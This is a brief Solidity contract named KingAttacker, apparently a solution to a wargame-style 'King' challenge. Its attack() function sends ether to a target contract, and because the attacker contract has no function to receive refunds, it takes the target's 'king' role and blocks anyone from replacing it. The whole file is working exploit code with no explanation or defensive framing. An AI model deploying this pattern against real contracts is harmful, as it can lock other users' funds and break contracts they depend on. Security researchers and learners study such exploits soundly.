// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingAttacker {
    address public king;
    uint256 public price;

    constructor(address _king, uint256 _price) {
        king = _king;
        price = _price;
    }

    function attack() external payable {
        (bool success, ) = payable(king).call{value: price}("");
        require(success, "Attack failed");
    }
}
